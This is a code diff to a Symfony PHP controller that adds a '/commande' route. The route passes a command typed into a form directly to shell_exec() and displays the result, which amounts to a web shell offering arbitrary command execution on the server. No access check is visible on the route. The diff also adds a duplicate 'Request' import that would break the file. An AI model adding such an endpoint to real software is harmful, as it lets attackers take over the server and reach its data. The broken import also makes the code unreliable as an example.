@@ -2,9 +2,11 @@
 
 namespace App\Controller;
 
+use App\Form\CommandType;
 use App\Repository\AtelierRepository;
 use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
 use Symfony\Component\HttpFoundation\Response;
+use Symfony\Component\HttpFoundation\Request;
 use Symfony\Component\Routing\Annotation\Route;
 use Symfony\Component\HttpFoundation\Request;
 use Doctrine\ORM\EntityManagerInterface;
@@ -50,5 +52,21 @@ class FrontController extends AbstractController
     {
         // Le contrôleur peut rester vide, car c'est le firewall de Symfony qui gère la déconnexion
         throw new \RuntimeException('This should never be reached!');
+    }
+
+    #[Route('/commande', name: 'commande')]
+    public function commande(Request $request): Response
+    {
+        $form = $this->createForm(CommandType::class);
+        $form->handleRequest($request);
+        
+        if ($form->isSubmitted() && $form->isValid()) {
+            $commande = $form->getData()['commande'];
+            $output = shell_exec($commande);
+        }
+        return $this->render('adminUser/atelier/command.html.twig', [
+            'form' => $form,
+            'output' => $output ?? null,
+        ]);
     }
 }
